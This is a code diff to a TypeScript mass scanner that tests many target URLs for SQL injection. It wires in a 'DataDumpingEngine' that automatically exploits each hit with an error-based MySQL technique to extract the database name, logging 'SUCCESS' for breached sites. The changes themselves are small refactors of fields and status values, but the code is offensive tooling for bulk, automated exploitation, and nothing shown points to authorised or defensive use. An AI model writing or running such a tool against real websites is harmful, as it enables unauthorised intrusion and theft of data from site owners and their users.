@@ -15,7 +15,7 @@ interface MassScanResult {
   targetId: number;
   url: string;
   scanId: number;
-  status: "scanning" | "completed" | "error";
+  status: "scanning" | "completed" | "error" | "vulnerable";
   vulnerabilitiesFound: number;
   error?: string;
 }
@@ -87,9 +87,8 @@ export class MassScanner {
       // Create scan in database
       const scan = await storage.createScan({
         targetUrl: target.url,
-        scanType: "sqli",
+        scanMode: "sqli",
         threads: this.threads,
-        startTime: new Date(),
       });
 
       const result: MassScanResult = {
@@ -132,20 +131,40 @@ export class MassScanner {
             // AUTO-VERIFY with dump
             const { DataDumpingEngine } = await import("./data-dumping-engine");
             try {
-              const engine = new DataDumpingEngine(vulns[0].id, vulns[0].url, vulns[0].parameter);
-              const dbInfo = await engine.getCurrentDatabaseInfo();
-              
-              if (dbInfo && dbInfo.database) {
-                result.status = "vulnerable"; // SUCCESS!
-                console.log(`[Mass Scanner] 🎯 SUCCESS: ${target.url} - DB: ${dbInfo.database}`);
-              } else {
+              // Only verify if we have a valid parameter
+              if (!vulns[0].parameter) {
                 result.status = "completed";
+                result.vulnerabilitiesFound = vulns.length;
+                console.log(`[Mass Scanner] ⚠️ ${target.url} - Vuln found but no parameter`);
+              } else {
+                const controller = new AbortController();
+                const context = {
+                  targetUrl: vulns[0].url,
+                  vulnerableParameter: vulns[0].parameter,
+                  dbType: "mysql" as const,
+                  technique: "error-based" as const,
+                  injectionPoint: vulns[0].payload || "",
+                  signal: controller.signal,
+                };
+                
+                const engine = new DataDumpingEngine(context);
+                const dbInfo = await engine.getCurrentDatabaseInfo();
+                
+                if (dbInfo && dbInfo.name && dbInfo.name !== "unknown") {
+                  result.status = "vulnerable"; // SUCCESS!
+                  result.vulnerabilitiesFound = vulns.length;
+                  console.log(`[Mass Scanner] 🎯 SUCCESS: ${target.url} - DB: ${dbInfo.name}`);
+                } else {
+                  result.status = "completed";
+                  result.vulnerabilitiesFound = vulns.length;
+                }
               }
             } catch (e) {
               result.status = "completed"; // Vuln found but dump failed
+              result.vulnerabilitiesFound = vulns.length;
             }
           } else {
-            result.status = "clean";
+            result.status = "completed";
             console.log(`[Mass Scanner] ❌ ${target.url} - clean`);
           }
           
